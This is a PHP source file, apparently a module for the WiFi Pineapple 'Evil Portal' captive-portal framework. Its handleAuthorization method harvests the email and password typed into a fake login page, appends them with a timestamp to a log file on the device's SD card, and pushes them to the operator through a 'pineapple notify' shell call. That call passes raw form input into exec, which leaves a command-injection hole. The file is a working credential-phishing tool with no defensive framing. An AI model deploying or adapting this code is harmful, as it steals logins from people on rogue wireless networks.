<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {
        // Check if evilportal-logs directory exists on sd, if not create directory
        if (!is_dir('/sd/evilportal-logs/')) {

          mkdir('/sd/evilportal-logs/');
        }
        // Append captured data to file on sd
        // UTC timestamp
        if (isset($_POST['email'])) {
            $email = isset($_POST['email']) ? $_POST['email'] : 'email';
            $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
            file_put_contents("/sd/evilportal-logs/oauth-login.txt", date('Y-m-d H:i:s') .  " {$email} - {$pwd}\n", FILE_APPEND);
            exec("pineapple notify $email' - '$pwd");
        }
        // handle form input or other extra things there

        // Call parent to handle basic authorization first
        parent::handleAuthorization();

    }

    public function showSuccess()
    {
        // Calls default success message
        parent::showSuccess();
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}
